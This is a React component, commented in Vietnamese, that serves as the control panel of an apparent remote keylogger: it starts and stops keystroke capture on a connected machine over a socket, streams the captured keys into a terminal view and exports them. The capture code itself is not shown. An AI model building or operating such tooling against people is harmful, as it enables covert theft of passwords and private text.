import { useState, useEffect, useRef } from 'react';
import { Keyboard, Play, Square, Trash2, Download, ShieldAlert } from 'lucide-react';
import { useSocket } from '../contexts/SocketContext';
import { sendCommand } from '../services/socketService';

export default function KeyloggerCard() {
    const [isLogging, setIsLogging] = useState(false);
    const [logs, setLogs] = useState<string>("");
    const { socket, isConnected, isSystemLocked } = useSocket(); // Lấy isSystemLocked
    const logContainerRef = useRef<HTMLDivElement>(null);

    // 1. Tự động dừng nếu bị khóa
    useEffect(() => {
        if (isSystemLocked && isLogging) {
            setIsLogging(false); // Stop UI state
            // Không cần gửi lệnh stop server vì server tự chặn rồi
            setLogs(prev => prev + "\n[SYSTEM] Logging halted by Firewall Lock.\n");
        }
    }, [isSystemLocked]);

    useEffect(() => {
        if (!socket) return;

        socket.on("ReceiveKey", (key: string) => {
            // Nếu bị khóa mà server vẫn lỡ gửi key thì lờ đi
            if (isSystemLocked) return;
            setLogs(prev => prev + key);
        });

        // Nhận log cũ từ server khi vừa mở lên (nếu cần)
        socket.on("ReceiveLogHistory", (history: string) => {
            setLogs(history);
        });

        return () => {
            socket.off("ReceiveKey");
            socket.off("ReceiveLogHistory");
        };
    }, [socket, isSystemLocked]);

    // Auto scroll
    useEffect(() => {
        if (logContainerRef.current) {
            logContainerRef.current.scrollTop = logContainerRef.current.scrollHeight;
        }
    }, [logs]);

    const handleStartLogging = async () => {
        if (isSystemLocked) return alert("⛔ Không thể bắt đầu: Hệ thống đang bị KHÓA!");

        setIsLogging(true);
        setLogs("");
        try {
            await sendCommand('start_keylog');
        } catch (err) {
            alert("Lỗi: " + err);
            setIsLogging(false);
        }
    };

    const handleStopLogging = async () => {
        setIsLogging(false);
        try {
            await sendCommand('stop_keylog');
        } catch (err) {
            alert("Lỗi: " + err);
        }
    };

    const handleDownloadLog = () => {
        if (!logs) return;
        const blob = new Blob([logs], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `keylog_${Date.now()}.txt`;
        a.click();
    };

    const clearLogs = () => setLogs("");

    return (
        <div className={`glass-panel p-6 rounded-lg h-full flex flex-col transition-colors duration-500 ${isSystemLocked ? 'bg-red-950/10 border-red-500/20' : ''}`}>

            {/* Header */}
            <div className="flex items-center justify-between mb-4">
                <h2 className={`text-lg font-bold tracking-wider flex items-center gap-2 ${isSystemLocked ? 'text-red-500 neon-glow-red' : 'text-green-500 neon-glow-green'}`}>
                    <Keyboard className="w-5 h-5" /> {'> KEYLOGGER_'}
                </h2>
                <div className="flex items-center gap-2">
                    {isSystemLocked ? (
                        <div className="flex items-center gap-1 bg-red-500/10 px-2 py-1 rounded border border-red-500/20">
                            <ShieldAlert className="w-3 h-3 text-red-500" />
                            <span className="text-red-500 text-[10px] font-bold">LOCKED</span>
                        </div>
                    ) : (
                        <>
                            <div className={`w-2 h-2 rounded-full ${isLogging ? 'bg-green-500 animate-pulse shadow-[0_0_10px_#10b981]' : 'bg-gray-500'}`} />
                            <span className={`text-xs ${isLogging ? 'text-green-500' : 'text-gray-500'}`}>
                                {isLogging ? 'CAPTURING' : 'IDLE'}
                            </span>
                        </>
                    )}
                </div>
            </div>

            {/* Màn hình Terminal */}
            <div
                ref={logContainerRef}
                className={`terminal-window p-4 rounded-lg mb-4 flex-1 overflow-y-auto font-mono text-sm bg-black shadow-inner min-h-[250px] transition-colors ${isSystemLocked ? 'border border-red-500/30' : 'border border-green-500/30'}`}
            >
                <div className={`${isSystemLocked ? 'text-red-500/50' : 'text-green-500/60'} mb-2 italic`}>
                    {isSystemLocked
                        ? '// ACCESS DENIED: SYSTEM FIREWALL ACTIVE'
                        : '// Waiting for keystrokes...'}
                </div>

                <pre className={`${isSystemLocked ? 'text-red-400' : 'text-green-500'} leading-relaxed whitespace-pre-wrap font-mono break-all`}>
                    {logs}
                </pre>

                {isLogging && !isSystemLocked && <span className="text-green-500 animate-pulse inline-block">█</span>}
            </div>

            {/* Buttons */}
            <div className="flex gap-3 mt-auto">
                <button
                    onClick={handleStartLogging}
                    disabled={isLogging || !isConnected || isSystemLocked}
                    className={`flex-1 px-4 py-3 rounded transition-all flex justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed ${isSystemLocked
                            ? 'bg-red-900/20 border border-red-500/30 text-red-500'
                            : 'bg-black neon-border-green hover:bg-green-950/30'
                        }`}
                >
                    {isSystemLocked ? <ShieldAlert className="w-4 h-4" /> : <Play className="w-4 h-4 text-green-500" />}
                    <span className={`font-bold text-sm ${isSystemLocked ? 'text-red-500' : 'text-green-500'}`}>
                        {isSystemLocked ? 'BLOCKED' : 'START'}
                    </span>
                </button>

                <button
                    onClick={handleStopLogging}
                    disabled={!isLogging}
                    className="flex-1 bg-black neon-border-red hover:bg-red-950/30 px-4 py-3 rounded transition-all disabled:opacity-50 flex justify-center gap-2"
                >
                    <Square className="w-4 h-4 text-red-500" />
                    <span className="text-red-500 font-bold text-sm">STOP</span>
                </button>

                <button
                    onClick={handleDownloadLog}
                    disabled={!logs}
                    className="bg-black border border-cyan-500/50 hover:bg-cyan-950/30 px-4 py-3 rounded transition-all disabled:opacity-30 text-cyan-500"
                    title="Download Logs"
                >
                    <Download className="w-4 h-4" />
                </button>

                <button onClick={clearLogs} className="bg-black neon-border-red px-4 py-3 rounded transition-all hover:bg-red-950/20">
                    <Trash2 className="w-4 h-4 text-red-500" />
                </button>
            </div>
        </div>
    );
}